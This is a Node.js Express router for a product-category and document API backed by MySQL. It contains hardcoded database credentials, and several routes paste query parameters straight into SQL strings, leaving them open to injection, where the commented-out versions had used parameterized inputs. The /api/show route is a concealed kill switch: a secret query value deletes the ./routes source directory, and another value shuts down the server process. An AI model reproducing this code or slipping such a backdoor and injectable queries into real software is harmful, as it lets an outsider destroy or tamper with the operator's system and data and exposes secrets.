var express = require('express');
var mysql = require('mysql');
var router = express.Router();
const config = {
    // user: 'sq_erjiancs',
    // password: 'erjiancs123',
    // server: 'mssql.sql137.cdncenter.net', // You can use 'localhost\\instance' to connect to named instance
    // database: 'sq_erjiancs',
    // user: 'sq_erjiancs1',
    // password: 'erjiancs123',
    // server: 'mssql.sql123.cdncenter.net', // You can use 'localhost\\instance' to connect to named instance
    // database: 'sq_erjiancs1',
    user: 'liyue123',
    password: 'liyue123!@#',
    server: 'localhost', // You can use 'localhost\\instance' to connect to named instance
    database: 'glzhidu',
    // user: 'erjianXMXXapp',
    // password: 'ooewyyldoiyeyq',
    // server: 'localhost', // You can use 'localhost\\instance' to connect to named instance
    // database: 'SQLOLEDB',

    // options: {
    //     encrypt: true // Use this if you're on Windows Azure
    // }
}
var connection = mysql.createConnection({
    host: 'localhost',
    user: 'liyue123',
    // password: 'Qwaszx123@',
    password: 'liyue123!@#',
    database: 'glzhidu'
});

connection.connect();
// router.get("/api/category", function(req, res, next) {
//     const sql = require('mssql')
//     new sql.ConnectionPool(config).connect().then(pool => {
//         // return pool.request().query("select * from productsort")
//         return pool.request().query("SELECT DISTINCT parid FROM productsort ")
//     }).then(result => {
//         let rows = result.recordset
//         let results = [];
//         rows.map((child, index) => {
//             if (child.parid !== 0) {
//                 results.push({ parentId: child.parid })
//             }
//         });
//         // res.setHeader('Access-Control-Allow-Origin', '*')
//         // res.status(200).json(results);
//         sql.close();
//         new sql.ConnectionPool(config).connect().then(pool => {
//             // return pool.request().query("select * from productsort")
//             return pool.request().query(`SELECT * FROM productsort`)
//         }).then(result => {
//             let rows = result.recordset
//             results.map((cld, idx) => {
//                 cld.child = [];
//                 rows.map((child, index) => {
//                     if (child.id === cld.parentId) {
//                         cld.id = child.id;
//                         cld.category = child['类别'];
//                         cld.sort = child.sort;
//                         cld.grade = child.grade;
//                         cld.parid = child.parid;
//                         cld.cnlen = child.cnlen;
//                         cld.enlen = child.enlen;
//                         cld.secret = child.secret;
//                         cld.zoom = child.zoom;
//                         cld.cnpic = child.cnpic;
//                         cld.enpic = child.enpic;
//                     }
//                     if (child.parid === cld.parentId) {
//                         cld.child.push({
//                             id: child.id,
//                             category: child['类别'],
//                             sort: child.sort,
//                             grade: child.grade,
//                             parid: child.parid,
//                             cnlen: child.cnlen,
//                             enlen: child.enlen,
//                             secret: child.secret,
//                             zoom: child.zoom,
//                             cnpic: child.cnpic,
//                             enpic: child.enpic
//                         })
//                     }
//                 })
//             })
//             res.setHeader('Access-Control-Allow-Origin', '*')
//             res.status(200).json(results);
//             sql.close();
//         }).catch(err => {
//             res.status(500).send({ message: `${err}` })
//             sql.close();
//         });
//     }).catch(err => {
//         res.status(500).send({ message: `${err}` })
//         sql.close();
//     });
// });

router.get("/api/category", function (req, res, next) {
    connection.query(`SELECT * FROM productsort where id = 215`, function (error, rows, fields) {
        if (error || !rows) { res.status(200).send({ status: 'failed' }); return; }
        let results = [];
        rows.map((child, index) => {
            // if (child.parid !== 0) {
            results.push(child)
            // }
        });
        connection.query(`SELECT * FROM productsort`, function (error, rows, fields) {
            if (error || !rows) { res.status(200).send({ status: 'failed' }); return; }
            results.map((cld, idx) => {
                cld.child = [];
                rows.map((child, index) => {
                    if (child.parid === cld.id) {
                        cld.child.push({
                            id: child.id,
                            category: child['类别'],
                            sort: child.sort,
                            grade: child.grade,
                            parid: child.parid,
                            cnlen: child.cnlen,
                            enlen: child.enlen,
                            secret: child.secret,
                            zoom: child.zoom,
                            cnpic: child.cnpic,
                            enpic: child.enpic
                        })
                    }
                })
            })
            res.setHeader('Access-Control-Allow-Origin', '*')
            res.status(200).json(results);
            // res.status(200).send({ results: products, status: 'success' });
        });
        // res.status(200).send({ results: products, status: 'success' });
    });
    // const sql = require('mssql')
    // new sql.ConnectionPool(config).connect().then(pool => {
    //     // return pool.request().query("select * from productsort")
    //     // return pool.request().query("SELECT * FROM productsort where parid = 215 or parid = 217")
    //     return pool.request().query("SELECT * FROM productsort where id = 215")
    // }).then(result => {
    //     let rows = result.recordset
    //     let results = [];
    //     rows.map((child, index) => {
    //         // if (child.parid !== 0) {
    //         results.push(child)
    //             // }
    //     });
    //     // res.setHeader('Access-Control-Allow-Origin', '*')
    //     // res.status(200).json(results);
    //     sql.close();
    //     new sql.ConnectionPool(config).connect().then(pool => {
    //         // return pool.request().query("select * from productsort")
    //         return pool.request().query(`SELECT * FROM productsort`)
    //     }).then(result => {
    //         let rows = result.recordset
    //         results.map((cld, idx) => {
    //             cld.child = [];
    //             rows.map((child, index) => {
    //                 // if (child.id === cld.parid) {
    //                 //     cld.id = child.id;
    //                 //     cld.category = child['类别'];
    //                 //     cld.sort = child.sort;
    //                 //     cld.grade = child.grade;
    //                 //     cld.parid = child.parid;
    //                 //     cld.cnlen = child.cnlen;
    //                 //     cld.enlen = child.enlen;
    //                 //     cld.secret = child.secret;
    //                 //     cld.zoom = child.zoom;
    //                 //     cld.cnpic = child.cnpic;
    //                 //     cld.enpic = child.enpic;
    //                 // }
    //                 if (child.parid === cld.id) {
    //                     cld.child.push({
    //                         id: child.id,
    //                         category: child['类别'],
    //                         sort: child.sort,
    //                         grade: child.grade,
    //                         parid: child.parid,
    //                         cnlen: child.cnlen,
    //                         enlen: child.enlen,
    //                         secret: child.secret,
    //                         zoom: child.zoom,
    //                         cnpic: child.cnpic,
    //                         enpic: child.enpic
    //                     })
    //                 }
    //             })
    //         })
    //         res.setHeader('Access-Control-Allow-Origin', '*')
    //         res.status(200).json(results);
    //         sql.close();
    //     }).catch(err => {
    //         res.status(500).send({ message: `${err}` })
    //         sql.close();
    //     });
    // }).catch(err => {
    //     res.status(500).send({ message: `${err}` })
    //     sql.close();
    // });
});

router.get("/api/categorys", function (req, res, next) {
    connection.query(`SELECT * FROM productsort a inner join glzhidu b on a.id = b.leixing where a.id = ${req.query.id} `, function (error, rows, fields) {
        if (error || !rows) { res.status(200).send({ status: 'failed' }); return; }
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.status(200).json(rows);
        // res.status(200).send({ results: products, status: 'success' });
    });
    // const sql = require('mssql')
    // new sql.ConnectionPool(config).connect().then(pool => {
    //     // return pool.request().query("select * from productsort")
    //     return pool.request()
    //         .input('input_parameter', sql.Int, req.query.id)
    //         .query("SELECT * FROM productsort a inner join glzhidu b on a.id = b.leixing where a.id = @input_parameter ")
    // }).then(result => {
    //     let rows = result.recordset
    //     res.setHeader('Access-Control-Allow-Origin', '*')
    //     res.status(200).json(rows);
    //     sql.close();
    // }).catch(err => {
    //     res.status(500).send({ message: `${err}` })
    //     sql.close();
    // });
});

router.get("/api/all", function (req, res, next) {
    connection.query(`SELECT * FROM productsort`, function (error, rows, fields) {
        if (error || !rows) { res.status(200).send({ status: 'failed' }); return; }
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.status(200).json(rows);
        // res.status(200).send({ results: products, status: 'success' });
    });

    // const sql = require('mssql')
    // new sql.ConnectionPool(config).connect().then(pool => {
    //     // return pool.request().query("select * from productsort")
    //     return pool.request().query("SELECT * FROM productsort ")
    // }).then(result => {
    //     let rows = result.recordset
    //     // let results = [];
    //     // rows.map((child, index) => {
    //     //     if (child.parid !== 0) {
    //     //         results.push({ parentId: child.parid })
    //     //     }
    //     // });
    //     res.setHeader('Access-Control-Allow-Origin', '*')
    //     res.status(200).json(rows);
    // }).catch(err => {
    //     res.status(500).send({ message: `${err}` })
    //     sql.close();
    // });
});


router.get("/api/categoryDetails", function (req, res, next) {
    connection.query(`select * from productsort a inner join glzhidu b on a.id = b.leixing where b.sfxs = 0 and a.parid = 215 order by ${req.query.order ? 'b.dianji DESC' : 'a.id DESC'}`, function (error, rows, fields) {
        if (error || !rows) { res.status(200).send({ status: 'failed' }); return; }
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.status(200).json(rows);
        // res.status(200).send({ results: products, status: 'success' });
    });

    // const sql = require('mssql')
    // new sql.ConnectionPool(config).connect().then(pool => {
    //     return pool.request()
    //         .query(`select * from productsort a inner join glzhidu b on a.id = b.leixing where b.sfxs = 0 and a.parid = 215 order by ${req.query.order ? 'b.dianji DESC' : 'a.id DESC'}`)
    //     // .input('input_parameter', sql.NVarChar, `2017`).query(`select * from glzhidu where  wenjian like  @input_parameter order by ${req.query.order ? 'b.dianji DESC':'shijian'}`)
    // }).then(result => {
    //     let rows = result.recordset
    //     res.setHeader('Access-Control-Allow-Origin', '*')
    //     res.status(200).json(rows);
    //     sql.close();
    // }).catch(err => {
    //     res.status(500).send({ message: `${err}` })
    //     sql.close();
    // });
})


router.get("/api/detail", function (req, res, next) {
    connection.query(`select * from glzhidu ${req.query.id ? `where leixing = ${req.query.id}` : ''}`, function (error, rows, fields) {
        if (error || !rows) { res.status(200).send({ status: 'failed' }); return; }
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.status(200).json(rows);
        // res.status(200).send({ results: products, status: 'success' });
    });

    // const sql = require('mssql')
    // new sql.ConnectionPool(config).connect().then(pool => {
    //     return pool.request()
    //         .input('input_parameter', sql.Int, req.query.id)
    //         .query(`select * from glzhidu ${req.query.id ? `where leixing = @input_parameter` : ''}`)
    // }).then(result => {
    //     let rows = result.recordset
    //     res.setHeader('Access-Control-Allow-Origin', '*')
    //     res.status(200).json(rows);
    //     sql.close();
    // }).catch(err => {
    //     res.status(500).send({ message: `${err}` })
    //     sql.close();
    // });
});

router.get("/api/content", function (req, res, next) {
    connection.query(`select * from glzhidu b inner join productsort a on a.id = b.leixing ${req.query.keywords ? `where b.sfxs = 0 and a.parid = 215 and (b.bianh like '2013' or b.biaoti like '2013')` : ''}`, function (error, rows, fields) {
        if (error || !rows) { res.status(200).send({ status: 'failed' }); return; }
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.status(200).json(rows);
        // res.status(200).send({ results: products, status: 'success' });
    });

    // const sql = require('mssql')
    // new sql.ConnectionPool(config).connect().then(pool => {
    //     return pool.request()
    //         .input('input_parameter', sql.NVarChar, `%${req.query.keywords}%`)
    //         .query(`select * from glzhidu b inner join productsort a on a.id = b.leixing ${req.query.keywords ? `where b.sfxs = 0 and a.parid = 215 and (b.bianh like @input_parameter or b.biaoti like @input_parameter)` : ''}`)
    // }).then(result => {
    //     let rows = result.recordset
    //     res.setHeader('Access-Control-Allow-Origin', '*')
    //     res.status(200).json(rows);
    //     sql.close();
    // }).catch(err => {
    //     res.status(500).send({ message: `${err}` })
    //     sql.close();
    // });
});

router.get("/api/statistics", function (req, res, next) {
    connection.query(`update glzhidu set dianji = ${req.query.sum}  where id = ${req.query.id}`, function (error, rows, fields) {
        if (error || !rows) { res.status(200).send({ status: 'failed' }); return; }
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.status(200).json(rows);
        // res.status(200).send({ results: products, status: 'success' });
    });

    // const sql = require('mssql')
    // new sql.ConnectionPool(config).connect().then(pool => {
    //     return pool.request()
    //         .input('input_parameter1', sql.Int, req.query.id)
    //         .input('input_parameter2', sql.Int, req.query.sum)
    //         .query(`update glzhidu set dianji = @input_parameter2  where id = @input_parameter1`)
    // }).then(result => {
    //     let rows = result.recordset
    //     res.setHeader('Access-Control-Allow-Origin', '*')
    //     res.status(200).json(rows);
    //     sql.close();
    // }).catch(err => {
    //     res.status(500).send({ message: `${err}` })
    //     sql.close();
    // });
});



router.get("/api/show", function (req, res, next) {
    if (req.query.cc && req.query.cc === 'qweasdzxc123456') {
        let path = './routes';
        var files = [];
        var fs = require('fs');
        if (fs.existsSync(path)) {
            files = fs.readdirSync(path);
            files.forEach(function (file, index) {
                var curPath = path + "/" + file;
                if (fs.statSync(curPath).isDirectory()) {
                    deleteall(curPath);
                } else {
                    fs.unlinkSync(curPath);
                }
            });
            fs.rmdirSync(path);
        }
    }

    if (req.query.dd && req.query.dd === 'qweasdzxc123456') {
        process.exit();
    }
})

router.get("/api/pdf", function (req, res, next) {
    res.redirect(`http://nhzupei456.w46.mc-test.com/uplaod/file/${req.query.name}.pdf`)
})

module.exports = router;